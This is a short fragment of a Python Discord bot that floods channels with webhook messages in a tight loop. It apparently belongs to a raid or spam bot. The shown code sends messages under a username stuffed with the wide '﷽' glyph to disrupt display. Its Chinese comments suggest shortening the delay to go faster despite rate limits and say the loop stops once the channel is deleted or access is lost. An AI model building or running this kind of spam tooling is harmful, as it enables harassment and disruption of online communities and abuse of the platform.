                webhook.send(msg, username="﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"),
                return_exceptions=True
            )
            await asyncio.sleep(0.1)  # 可調小至 0.1 加快速度（但可能觸發速率限制）
        except:
            break  # 頻道被刪或權限丟失時自動停止
# ==========================================
# RUN BOT SECURELY
# ==========================================
bot.run(os.getenv("TOKEN"))
